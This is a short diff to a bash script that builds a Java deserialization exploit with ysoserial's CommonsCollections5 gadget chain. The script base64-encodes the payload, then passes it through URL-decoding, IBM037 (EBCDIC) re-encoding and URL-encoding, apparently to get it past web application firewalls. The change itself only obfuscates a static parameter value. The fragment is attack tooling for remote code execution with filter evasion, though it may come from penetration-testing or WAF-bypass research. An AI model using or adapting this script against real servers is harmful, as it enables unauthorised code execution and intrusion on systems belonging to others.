@@ -50,7 +50,7 @@ function preproc {
 
 charset=ibm037
 processors=(urldecode "enc '${charset^^}'" urlencode)
-static_data='param1=val1&state='
+static_data='param1=v%61l%201&state='
 payload=$(java -jar ysoserial.jar CommonsCollections5 "$1"|base64 -w0)
 data=$(printf "%s" "${static_data}${payload}"|preproc processors)
 
